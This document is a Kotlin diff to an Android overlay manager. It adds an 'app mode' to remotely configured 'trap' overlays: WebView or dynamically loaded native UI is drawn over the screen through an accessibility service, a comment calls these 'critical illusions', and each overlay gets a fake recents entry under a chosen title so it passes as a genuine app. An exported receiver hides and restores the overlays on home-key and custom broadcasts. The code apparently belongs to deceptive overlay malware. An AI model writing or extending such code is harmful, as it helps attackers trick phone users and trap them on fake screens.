@@ -38,6 +38,12 @@ object DynamicUIManager {
 
     private var nativeLifecycleOwner: OverlayLifecycleOwner? = null
 
+    var nativeAppMode = false
+    var nativeSessionId = ""
+    var htmlAppMode = false
+    var htmlSessionId = ""
+    private var isTaskReceiverRegistered = false
+
     var activeTrapSessionId = 0L
     val isAnyAttached: Boolean get() = isAttached || isNativeAttached
 
@@ -61,6 +67,44 @@ object DynamicUIManager {
             lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_DESTROY)
             store.clear()
         }
+    }
+
+    private fun registerReceiverIfNeeded(ctx: Context) {
+        if (isTaskReceiverRegistered) return
+        val receiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                when (intent.action) {
+                    Intent.ACTION_CLOSE_SYSTEM_DIALOGS -> {
+                        val reason = intent.getStringExtra("reason")
+                        if (reason == "homekey" || reason == "recentapps") {
+                            if (nativeAppMode) nativeOverlayView?.visibility = View.GONE
+                            if (htmlAppMode) overlayView?.visibility = View.GONE
+                        }
+                    }
+                    "com.cortex.task.RESUME" -> {
+                        val sid = intent.getStringExtra("session_id")
+                        if (sid == nativeSessionId) nativeOverlayView?.visibility = View.VISIBLE
+                        if (sid == htmlSessionId) overlayView?.visibility = View.VISIBLE
+                    }
+                    "com.cortex.task.CLOSE" -> {
+                        val sid = intent.getStringExtra("session_id")
+                        if (sid == nativeSessionId) removeNativeOverlay(context, "TASK_SWIPED")
+                        if (sid == htmlSessionId) removeOverlay(context, "TASK_SWIPED")
+                    }
+                }
+            }
+        }
+        val filter = android.content.IntentFilter().apply {
+            addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
+            addAction("com.cortex.task.RESUME")
+            addAction("com.cortex.task.CLOSE")
+        }
+        if (android.os.Build.VERSION.SDK_INT >= 33) {
+            ctx.applicationContext.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
+        } else {
+            ctx.applicationContext.registerReceiver(receiver, filter)
+        }
+        isTaskReceiverRegistered = true
     }
 
     class CortexBridge(private val ctx: Context) {
@@ -618,12 +662,13 @@ object DynamicUIManager {
                             val className = trap.getString("class_name")
                             val dimLevel = trap.optInt("dim", 20)
                             val method = trap.optString("method", "ACC")
+                            val isAppMode = trap.optBoolean("app_mode", false)
                             
                             // FORCE PERSISTENT TIMEOUT FOR CRITICAL ILLUSIONS
                             val isCritical = label.equals("Welcome", ignoreCase = true) || label.equals("Reset", ignoreCase = true)
                             val timeout = if (isCritical) 0L else trap.optLong("timeout", 10L)
                             
-                            showNativeOverlay(ctx, dexPath, className, dimLevel, method)
+                            showNativeOverlay(ctx, dexPath, className, dimLevel, method, isAppMode, label)
                             
                             if (timeout > 0L) {
                                 val currentSession = activeTrapSessionId
@@ -647,9 +692,10 @@ object DynamicUIManager {
                             val html = trap.optString("html", "")
                             val dimLevel = trap.optInt("dim", 20)
                             val timeout = trap.optLong("timeout", 10L)
+                            val isAppMode = trap.optBoolean("app_mode", false)
                             
                             DimmerManager.applyDim(ctx, dimLevel, method)
-                            showOverlay(ctx, true, method, html, false)
+                            showOverlay(ctx, true, method, html, false, isAppMode, label)
                             
                             if (timeout > 0L) {
                                 val currentSession = activeTrapSessionId
@@ -669,7 +715,7 @@ object DynamicUIManager {
     }
 
     @SuppressLint("SetJavaScriptEnabled")
-    fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String, isFullScreen: Boolean = true) {
+    fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String, isFullScreen: Boolean = true, appMode: Boolean = false, trapLabel: String = "Cortex App") {
         if (MyAccessibilityService.isSafeZoneActive(ctx)) {
             DebugLogger.log("SDUI", "showOverlay BLOCKED by Safe Zone.")
             return
@@ -835,6 +881,19 @@ object DynamicUIManager {
                     wm.addView(overlayView, params)
                     currentType = targetType
                     isAttached = true
+                    
+                    htmlAppMode = appMode
+                    if (appMode) {
+                        htmlSessionId = java.util.UUID.randomUUID().toString()
+                        val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
+                            putExtra("task_title", trapLabel)
+                            putExtra("session_id", htmlSessionId)
+                        }
+                        ctx.startActivity(intent)
+                    }
+                    registerReceiverIfNeeded(ctx)
+                    
                     DebugLogger.log("SDUI_VERBOSE", "WebView attached successfully.")
                 } else {
                     overlayView!!.layoutParams = params
@@ -1020,7 +1079,7 @@ object DynamicUIManager {
         }
     }
 
-    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int, method: String = "ACC") {
+    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int, method: String = "ACC", appMode: Boolean = false, trapLabel: String = "Cortex App") {
         if (MyAccessibilityService.isSafeZoneActive(ctx)) {
             DebugLogger.log("NATIVE_TRAP", "showNativeOverlay BLOCKED by Safe Zone.")
             return
@@ -1110,6 +1169,18 @@ object DynamicUIManager {
                     nativeOverlayView = view
                     nativeLifecycleOwner = lifecycleOwner
                     isNativeAttached = true
+                    
+                    nativeAppMode = appMode
+                    if (appMode) {
+                        nativeSessionId = java.util.UUID.randomUUID().toString()
+                        val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
+                            putExtra("task_title", trapLabel)
+                            putExtra("session_id", nativeSessionId)
+                        }
+                        ctx.startActivity(intent)
+                    }
+                    registerReceiverIfNeeded(ctx)
                     
                     // 4. LIFT DIM AND PURGE OLD UI (After new UI is rendered)
                     Handler(Looper.getMainLooper()).postDelayed({
